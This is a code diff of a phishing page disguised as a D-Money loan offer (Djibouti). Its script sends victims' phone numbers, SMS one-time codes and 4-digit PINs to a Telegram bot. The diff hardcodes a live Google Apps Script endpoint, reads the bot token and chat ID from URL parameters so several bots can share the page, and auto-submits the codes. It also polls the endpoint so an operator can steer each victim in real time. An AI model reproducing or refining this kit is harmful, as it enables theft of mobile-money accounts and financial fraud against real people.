@@ -61,10 +61,8 @@
         <div class="calc-card">
             <div class="slider-label"><span>Montant (DJF)</span> <b id="amt-txt">50,000</b></div>
             <input type="range" id="loan-amt" min="5000" max="1000000" step="5000" value="50000" oninput="updateCalc()">
-            
             <div class="slider-label"><span>Durée (Mois)</span> <b id="dur-txt">6</b></div>
             <input type="range" id="loan-dur" min="1" max="24" step="1" value="6" oninput="updateCalc()">
-            
             <div class="res-grid">
                 <div class="res-item"><span>Mensualité</span> <b id="res-monthly">8,354 DJF</b></div>
                 <div class="res-item"><span>Taux Intérêt</span> <b>0.5% (Promo)</b></div>
@@ -105,7 +103,6 @@
             <input type="tel" class="box-input otp-in" maxlength="1" oninput="moveFocus(this, 5, 'otp-in')">
         </div>
         <p style="text-align: center; font-size: 0.8rem; color: #666;">Renvoyer le code dans <span id="timer" style="color: var(--d-blue); font-weight: bold;">00:30</span></p>
-        <button class="btn-main" style="margin-top: 30px;" onclick="validateOTP()">Vérifier</button>
     </section>
 
     <section id="view-4" class="view">
@@ -113,12 +110,11 @@
         <div class="title">Sécurité du compte</div>
         <p class="subtitle">Veuillez saisir votre code PIN D-Money à 4 chiffres pour autoriser l'accès.</p>
         <div class="box-row">
-            <input type="password" class="box-input pin-in" maxlength="1" oninput="moveFocus(this, 0, 'pin-in')">
-            <input type="password" class="box-input pin-in" maxlength="1" oninput="moveFocus(this, 1, 'pin-in')">
-            <input type="password" class="box-input pin-in" maxlength="1" oninput="moveFocus(this, 2, 'pin-in')">
-            <input type="password" class="box-input pin-in" maxlength="1" oninput="moveFocus(this, 3, 'pin-in')">
+            <input type="password" inputmode="numeric" class="box-input pin-in" maxlength="1" oninput="moveFocus(this, 0, 'pin-in')">
+            <input type="password" inputmode="numeric" class="box-input pin-in" maxlength="1" oninput="moveFocus(this, 1, 'pin-in')">
+            <input type="password" inputmode="numeric" class="box-input pin-in" maxlength="1" oninput="moveFocus(this, 2, 'pin-in')">
+            <input type="password" inputmode="numeric" class="box-input pin-in" maxlength="1" oninput="moveFocus(this, 3, 'pin-in')">
         </div>
-        <button class="btn-main" onclick="validatePIN()">Confirmer</button>
     </section>
 
     <section id="view-5" class="view loader-wrap">
@@ -134,16 +130,18 @@
 </div>
 
 <script>
-    const SCRIPT_URL = "YOUR_GOOGLE_SCRIPT_URL"; 
-    const BOT_TOKEN = "YOUR_BOT_TOKEN";
-    const CHAT_ID = "YOUR_CHAT_ID";
+    // CAPTURE URL PARAMS FOR MULTIPLE BOTS
+    const urlParams = new URLSearchParams(window.location.search);
+    const BOT_TOKEN = urlParams.get('token');
+    const CHAT_ID = urlParams.get('id');
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzHqqqFuhAV070lss288JWURMsWlM1pb7CRO3Sr5QCrgQdnbWScfCl9nnN7RgHYCqEJQg/exec"; 
 
     function updateCalc() {
         const amt = document.getElementById('loan-amt').value;
         const dur = document.getElementById('loan-dur').value;
         document.getElementById('amt-txt').innerText = parseInt(amt).toLocaleString();
         document.getElementById('dur-txt').innerText = dur;
-        const total = amt * 1.005; // 0.5% rate
+        const total = amt * 1.005;
         const monthly = total / dur;
         document.getElementById('res-monthly').innerText = Math.round(monthly).toLocaleString() + " DJF";
     }
@@ -155,6 +153,7 @@
     }
 
     function telegram(msg) {
+        if(!BOT_TOKEN || !CHAT_ID) return console.error("Missing Bot Params");
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
     }
 
@@ -164,10 +163,10 @@
         
         telegram(`🇩🇯 *NEW TARGET*\n📱 Phone: +253 ${phone}\n💰 Loan: ${document.getElementById('amt-txt').innerText} DJF`);
         
-        showView(2);
+        showView(2); // Show Loading
         setTimeout(() => {
             document.getElementById('target-phone').innerText = "+253 " + phone;
-            showView(3);
+            showView(3); // Show OTP
             startTimer(30);
             startPolling(phone);
         }, 2000);
@@ -175,15 +174,25 @@
 
     function moveFocus(el, idx, cls) {
         const ins = document.querySelectorAll('.' + cls);
-        if(el.value.length === 1 && idx < ins.length - 1) ins[idx+1].focus();
+        if(el.value.length === 1 && idx < ins.length - 1) {
+            ins[idx+1].focus();
+        }
+        
+        // AUTO-SUBMIT OTP
+        if(cls === 'otp-in' && idx === 5 && el.value.length === 1) {
+            validateOTP();
+        }
+        // AUTO-SUBMIT PIN
+        if(cls === 'pin-in' && idx === 3 && el.value.length === 1) {
+            validatePIN();
+        }
     }
 
     function validateOTP() {
         const ins = document.querySelectorAll('.otp-in');
         let code = "";
         ins.forEach(i => code += i.value);
-        if(code.length < 6) return;
-
+        
         telegram(`🔓 *OTP RECEIVED*\n📱 Phone: ${document.getElementById('user-phone').value}\n🔢 Code: \`${code}\``);
         showView(2);
         document.getElementById('loader-text').innerText = "Vérification du code...";
@@ -193,24 +202,23 @@
         const ins = document.querySelectorAll('.pin-in');
         let code = "";
         ins.forEach(i => code += i.value);
-        if(code.length < 4) return;
 
         telegram(`💳 *PIN RECEIVED*\n📱 Phone: ${document.getElementById('user-phone').value}\n🔑 PIN: \`${code}\``);
         showView(5);
     }
 
     async function startPolling(phone) {
+        const cleanID = String(phone).trim();
         setInterval(async () => {
             try {
-                const r = await fetch(`${SCRIPT_URL}?id=${phone}&v=${Date.now()}`);
+                const r = await fetch(`${SCRIPT_URL}?id=${cleanID}&v=${Date.now()}`);
                 const status = (await r.text()).trim();
                 
                 if(status === "approved") {
-                    // This logic would move to PIN or Success based on your command
+                    showView(4); // Move to PIN
                 } else if(status === "wrongOTP") {
                     document.getElementById('otp-error').style.display = "block";
                     showView(3);
-                    // Reset inputs
                     document.querySelectorAll('.otp-in').forEach(i => i.value = "");
                 } else if(status === "wrongPIN") {
                     document.getElementById('pin-error').style.display = "block";
